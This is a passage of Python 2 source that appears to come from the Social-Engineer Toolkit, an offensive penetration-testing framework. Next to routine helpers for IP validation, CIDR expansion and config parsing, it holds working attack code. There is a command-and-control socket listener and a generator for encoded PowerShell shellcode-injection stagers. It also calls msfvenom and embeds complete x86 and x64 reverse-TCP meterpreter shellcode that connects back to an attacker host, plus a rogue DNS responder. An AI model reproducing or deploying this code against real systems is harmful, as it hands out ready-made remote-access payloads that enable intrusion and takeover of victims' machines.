            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# ipv6
def is_valid_ipv6(ip):
    """Validates IPv6 addresses.
    """
    pattern = re.compile(r"""
        ^
        \s*                         # Leading whitespace
        (?!.*::.*::)                # Only a single whildcard allowed
        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
        (?:                         # Repeat 6 times:
            [0-9a-f]{0,4}           # A group of at most four hexadecimal digits
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
        ){6}                        #
        (?:                         # Either
            [0-9a-f]{0,4}           # Another group
            (?:(?<=::)|(?<!::):)    # Colon unless preceeded by wildcard
            [0-9a-f]{0,4}           # Last group
            (?: (?<=::)             # Colon iff preceeded by exacly one colon
             |  (?<!:)              #
             |  (?<=:) (?<!::) :    #
             )                      # OR
         |                          # A v4 address with NO leading zeros
            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            (?: \.
                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            ){3}
        )
        \s*                         # Trailing whitespace
        $
    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
    return pattern.match(ip) is not None


# kill certain processes
def kill_proc(port,flag):
    proc=subprocess.Popen("netstat -antp | grep '%s'" % (port), shell=True, stdout=subprocess.PIPE)
    stdout_value=proc.communicate()[0]
    a=re.search("\d+/%s" % (flag), stdout_value)
    if a:
        b=a.group()
        b=b.replace("/%s" % (flag),"")
        subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()


# check the config file and return value
def check_config(param):
    fileopen = file("%s/config/set_config" % (definepath()), "r")
    for line in fileopen:
        line=line.rstrip()
        #print line
        # if the line starts with the param we want then we are set, otherwise if it starts with a # then ignore
        if line.startswith(param) != "#":
           if line.startswith(param):
                line = line.rstrip()
                # remove any quotes or single quotes
                line = line.replace('"', "")
                line = line.replace("'", "")
                line = line.split("=")
                return line[1]

# copy an entire folder function
def copyfolder(sourcePath, destPath):
    for root, dirs, files in os.walk(sourcePath):

    #figure out where we're going
        dest = destPath + root.replace(sourcePath, '')

        #if we're in a directory that doesn't exist in the destination folder
        #then create a new folder
        if not os.path.isdir(dest):
            os.mkdir(dest)

        #loop through all files in the directory
        for f in files:

            #compute current (old) & new file locations
            oldLoc = root + '/' + f
            newLoc = dest + '/' + f

            if not os.path.isfile(newLoc):
                try:
                    shutil.copy2(oldLoc, newLoc)
                except IOError:
                    pass


# this routine will be used to check config options within the set.options
def check_options(option):
        # open the directory
    trigger = 0
    fileopen = file(setdir + "/set.options", "r").readlines()
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = line.rstrip()
            line = line.replace('"', "")
            line = line.split("=")
            return line[1]
            trigger = 1
    if trigger == 0: return trigger

# future home to update one localized set configuration file
def update_options(option):
        # if the file isn't there write a blank file
    if not os.path.isfile(setdir + "/set.options"):
        filewrite = file(setdir + "/set.options", "w")
        filewrite.write("")
        filewrite.close()

    # remove old options
    fileopen = file(setdir + "/set.options", "r")
    old_options = ""
    for line in fileopen:
        match = re.search(option, line)
        if match:
            line = ""
        old_options = old_options + line
    # append to file
    filewrite = file(setdir + "/set.options", "w")
    filewrite.write(old_options + "\n" + option + "\n")
    filewrite.close()

# python socket listener
def socket_listener(port):
    port = int(port)          # needed integer for port
    host = ''                 # Symbolic name meaning the local host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print "Listening on 0.0.0.0:%s" % str(port)
    # listen for only 1000 connection
    s.listen(1000)
    conn, addr = s.accept()
    print 'Connected by', addr
    data = conn.recv(1024)
    # start loop

    while 1:
        command = raw_input("Enter shell command or quit: ")
        conn.send(command)
        # if we specify quit then break out of loop and close socket
        if command == "quit": break
        data = conn.recv(1024)
        print data
    conn.close()

# generates powershell payload
def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):

    # generate our shellcode first
    shellcode = metasploit_shellcode(payload, ipaddr, port)
    shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
    # sub in \x for 0x
    shellcode = re.sub("\\\\x", "0x", shellcode)
    # base counter
    counter = 0
    # count every four characters then trigger floater and write out data
    floater = ""
    # ultimate string
    newdata = ""
    for line in shellcode:
        floater = floater + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    # heres our shellcode prepped and ready to go
    shellcode = newdata[:-1]

    # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))

    # unicode and base64 encode and return it
    return base64.b64encode(powershell_command.encode('utf_16_le'))

# generate base shellcode
def generate_shellcode(payload,ipaddr,port):
    msf_path = meta_path()
    # generate payload
    port = port.replace("LPORT=", "")
    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
    # return data
    return data

# this will take input for shellcode and do a replace for IP addresses
def shellcode_replace(ipaddr, port, shellcode):

    # split up the ip address
    ip = ipaddr.split('.')
    # join the ipaddress into hex value spaces still in tact
    ipaddr = ' '.join((hex(int(i))[2:] for i in ip))

    # We use a default 255.254.253.252 on all shellcode then replace
    # 255.254.253.252 --> hex --> ff fe fd fc
    # 443 = '0x1bb'
    if port != "443":
        port = hex(int(port))
        # hack job in order to get ports into right format
        # if we are only using three numbers then you have to flux in a zero
        if len(port) == 5:
            port = port.replace("0x", "\\x0")
        else:
            port = port.replace("0x", "\\x")
        # here we break the counters down a bit to get the port into the right format
        counter = 0
        new_port = ""
        for a in port:
            if counter < 4:
                new_port += a
            if counter == 4:
                new_port += "\\x" + a
                counter = 0
            counter = counter + 1
        # redefine the port in hex here
        port = new_port

    ipaddr = ipaddr.split(" ")
    first = ipaddr[0]
    # split these up to make sure its in the right format
    if len(first) == 1:
        first = "0" + first
    second = ipaddr[1]
    if len(second) == 1:
        second = "0" + second
    third = ipaddr[2]
    if len(third) == 1:
        third = "0" + third
    fourth = ipaddr[3]
    if len(fourth) == 1:
        fourth = "0" + fourth

    # put the ipaddress into the right format
    ipaddr = "\\x%s\\x%s\\x%s\\x%s" % (first,second,third,fourth)
    shellcode = shellcode.replace(r"\xff\xfe\xfd\xfc", ipaddr)

    if port != "443":
        # getting everything into the right format
        if len(port) > 4:
            port = "\\x00" + port
        # if we are using a low number like 21, 23, etc.
        if len(port) == 4:
            port = "\\x00\\x00" + port
        shellcode = shellcode.replace(r"\x00\x01\xbb", port)

    # return shellcode
    return shellcode

# exit routine
def exit_set():
    cleanup_routine()
    print "\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n"
    sys.exit()


# these are payloads that are callable
def metasploit_shellcode(payload, ipaddr, port):

    # if we are using reverse meterpreter tcp
    if payload == "windows/meterpreter/reverse_tcp":
        #shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
        shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"

    # reverse https requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_https":
        print_status("Reverse_HTTPS takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse http requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_http":
        print_status("Reverse_HTTP takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # allports requires generation through msfvenom
    if payload == "windows/meterpreter/reverse_tcp_allports":
        print_status("Reverse TCP Allports takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse tcp needs to be rewritten for shellcode, will do later
    if payload == "windows/shell/reverse_tcp":
        print_status("Reverse Shell takes a few seconds to calculate..One moment..")
        shellcode = generate_shellcode(payload, ipaddr, port)

    # reverse meterpreter tcp
    if payload == "windows/x64/meterpreter/reverse_tcp":
        shellcode = r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"

    return shellcode

# here we encrypt via aes, will return encrypted string based on secret key which is random
def encryptAES(secret, data):

    # the character used for padding--with a block cipher such as AES, the value
    # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
    # used to ensure that your value is always a multiple of BLOCK_SIZE
    PADDING = '{'

    BLOCK_SIZE = 32

    # one-liner to sufficiently pad the text to be encrypted
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

    # random value here to randomize builds
    a = 50 * 5

    # one-liners to encrypt/encode and decrypt/decode a string
    # encrypt with AES, encode with base64
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

    cipher = AES.new(secret)

    aes = EncodeAES(cipher, data)
    return str(aes)

# compare ports to make sure its not already in a config file for metasploit
def check_ports(filename, port):
    fileopen = file(filename, "r")
    data = fileopen.read()
    match = re.search("LPORT " + port, data)
    if match:
        return True
    else:
        return False

# main dns class
class DNSQuery:
    def __init__(self, data):
        self.data=data
        self.dominio=''

        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini=12
            lon=ord(data[ini])
            while lon != 0:
                self.dominio+=data[ini+1:ini+lon+1]+'.'
                ini+=lon+1
                lon=ord(data[ini])

    def respuesta(self, ip):
        packet=''
        if self.dominio:
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
        return packet

# main dns routine
def dns():
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udps.bind(('',53))
        try:
            while 1:
                data, addr = udps.recvfrom(1024)
                p=DNSQuery(data)
                udps.sendto(p.respuesta(ip), addr)

        except KeyboardInterrupt:
            print "Exiting the DNS Server.."
            sys.exit()
            udps.close()

# start dns 
def start_dns():
		thread.start_new_thread(dns,())

# the main ~./set path for SET 
def setdir():
    if check_os() == "posix":
        return os.path.join(os.path.expanduser('~'), '.set')
    if check_os() == "windows":
        return "src/program_junk/"
# set the main directory for SET 
setdir = setdir()

# Copyright (c) 2007 Brandon Sterne
# Licensed under the MIT license.
# http://brandon.sternefamily.net/files/mit-license.txt
# CIDR Block Converter - 2007

# convert an IP address from its dotted-quad format to its
# 32 binary digit representation
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# convert a decimal number to binary representation
# if d is specified, left-pad the binary number with 0s to that length
def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

# print a list of IP addresses based on the CIDR block specified
def printCIDR(c):
        parts = c.split("/")
        baseIP = ip2bin(parts[0])
        subnet = int(parts[1])
        # Python string-slicing weirdness:
        # if a subnet of 32 was specified simply print the single IP
        if subnet == 32:
            ipaddr = bin2ip(baseIP)
        # for any other size subnet, print a list of IP addresses by concatenating
        # the prefix with each of the suffixes in the subnet
        else:
            ipPrefix = baseIP[:-(32-subnet)]
            breakdown = ''
            for i in range(2**(32-subnet)):
                ipaddr = bin2ip(ipPrefix+dec2bin(i, (32-subnet)))
                ip_check = is_valid_ip(ipaddr)
                if ip_check != False:
                    #return str(ipaddr)
                    breakdown = breakdown + str(ipaddr) + ","
            return breakdown

# input validation routine for the CIDR block specified
def validateCIDRBlock(b):
    # appropriate format for CIDR block ($prefix/$subnet)
    p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        return False
    # extract prefix and subnet size
    prefix, subnet = b.split("/")
    # each quad has an appropriate value (1-255)
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            #print "Error: quad "+str(q)+" wrong size."
            return False
    # subnet is an appropriate value (1-32)
    if (int(subnet) < 1) or (int(subnet) > 32):
        print "Error: subnet "+str(subnet)+" wrong size."
        return False
    # passed all checks -> return True
    return True

# Queries a remote host on UDP:1434 and returns MSSQL running port
# Written by Larry Spohn (spoonman) @ TrustedSec
def get_sql_port(host):

    # Build the socket with a .1 second timeout
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(.1)

    # Attempt to query UDP:1434 and return MSSQL running port
    try:
        port = 1434;
        msg = "\x02\x41\x41\x41\x41"
        s.sendto(msg, (host, port))
        d = s.recvfrom(1024)

        sql_port = d[0].split(";")[9]
        return sql_port

    except:
        pass

# capture output from a function
def capture(func, *args, **kwargs):
    """Capture the output of func when called with the given arguments.

    The function output includes any exception raised. capture returns
    a tuple of (function result, standard output, standard error).
    """
    stdout, stderr = sys.stdout, sys.stderr
    sys.stdout = c1 = cStringIO.StringIO()
    sys.stderr = c2 = cStringIO.StringIO()
    result = None
    try:
        result = func(*args, **kwargs)
    except:
        traceback.print_exc()
    sys.stdout = stdout
    sys.stderr = stderr
    return (result, c1.getvalue(), c2.getvalue())


def check_kali():
    if os.path.isfile("/etc/apt/sources.list"):
        kali = file("/etc/apt/sources.list", "r")
        kalidata = kali.read()
        if "kali" in kalidata:
            return "Kali"
        # if we aren't running kali
        else: return "Non-Kali"
    else:
        print "[!] Not running a Debian variant.."
        return "Non-Kali"

# checking if we have bleeding-edge enabled for updates
def bleeding_edge():
    # first check if we are actually using Kali
    kali = check_kali()
    if kali == "Kali":
        print_status("Checking to see if bleeding-edge repos are active.")
        # check if we have the repos enabled first
        fileopen = file("/etc/apt/sources.list", "r")
        kalidata = fileopen.read()
        if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
            print_status("Bleeding edge already active..Moving on..")
            return True
        else:
            print_warning("Bleeding edge repos were not detected. This is recommended.")
            enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
            if enable == "y" or enable == "yes":
                print_status("Adding Kali bleeding edge to sources.list for updates.")
                # we need to add repo to kali file
                # we will rewrite the entire apt in case not all repos are there
                filewrite = file("/etc/apt/sources.list", "w")
                filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
                filewrite.close()
                print "[*] It is recommended to now run apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove and restart SET."
                return True
            else:
                print "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!"

# here we give multiple options to specify for SET java applet
def applet_choice():
    
    # prompt here 
    print """
[-------------------------------------------]
Java Applet Configuration Options Below
[-------------------------------------------]

Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.

Select which option you want:

1. Make my own self-signed certificate applet.
2. Use the applet built into SET.
3. I have my own code signing certificate or applet.\n"""

    choice1 = raw_input("Enter the number you want to use [1-3]: ")

    # use the default
    if choice1 == "": choice1 = "2"

    # make our own
    if choice1 == "1":
        try: import src.html.unsigned.self_sign
        except: reload(src.html.unsigned.self_sign)

    # if we need to use the built in applet
    if choice1 == "2":
        print_status("Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of Java :(")

    # if we want to build our own
    if choice1 == "3":
        try: import src.html.unsigned.verified_sign
        except: reload(src.html.unsigned.verified_sign)
